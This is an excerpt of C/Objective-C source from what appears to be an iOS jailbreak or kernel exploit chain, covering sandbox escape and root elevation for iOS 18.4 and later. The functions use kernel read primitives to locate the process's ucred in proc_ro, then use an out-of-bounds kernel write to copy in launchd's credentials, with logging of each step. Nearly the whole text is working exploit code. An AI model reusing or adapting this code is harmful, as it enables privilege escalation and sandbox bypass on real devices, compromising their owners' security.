...
int sandbox_escape(uint64_t self_proc) {
    ...
    // Dynamically scan for ucred — offset varies by iOS build (18.4+ changed)
    NSLog(@"[SBX] Scanning proc_ro for ucred...");
    uint64_t ucred = 0;
    uint32_t ucred_off = 0;
    if (sbx_find_ucred_slot(self_proc, &ucred, &ucred_off) != 0) {
        NSLog(@"[SBX] ucred not found in proc_ro");
        return -1;
    }
    NSLog(@"[SBX] Found ucred at proc_ro+0x%x = 0x%llx", ucred_off, ucred);
...
int sandbox_elevate_to_root(uint64_t self_proc) {
    ...
    // Dynamically find our own ucred (offset varies by iOS build)
    uint64_t ourucred = 0;
    uint32_t our_off = 0;
    if (sbx_find_ucred_slot(self_proc, &ourucred, &our_off) != 0) {
        NSLog(@"[SBX] elevate: could not find our ucred via dynamic scan");
        return -1;
    }
    NSLog(@"[SBX] elevate: ourucred: 0x%llx (at proc_ro+0x%x)", ourucred, our_off);

    // Write launchd's ucred to the same offset we found our ucred at
    uint64_t ourproc_ro = S(early_kread64(self_proc + OFF_PROC_PROC_RO));
    int wr = early_kwrite64(ourproc_ro + our_off, launchducred);
    if (wr != 0) {
        NSLog(@"[SBX] elevate: OOB write FAILED at proc_ro+0x%x (errno in kexploit log)", our_off);
        // Do NOT crash — the write address might be write-protected.
        // Try a diagnostic: can we read the address back?
        uint64_t diag = early_kread64(ourproc_ro + our_off);
        NSLog(@"[SBX] elevate: read-back at proc_ro+0x%x = 0x%llx (expected launchd ucred 0x%llx)",
              our_off, diag, launchducred);
        // Report failure but don't abort
        NSLog(@"[SBX] elevate failed, uid: %d (OOB write rejected by kernel)", getuid());
        return -1;
    }
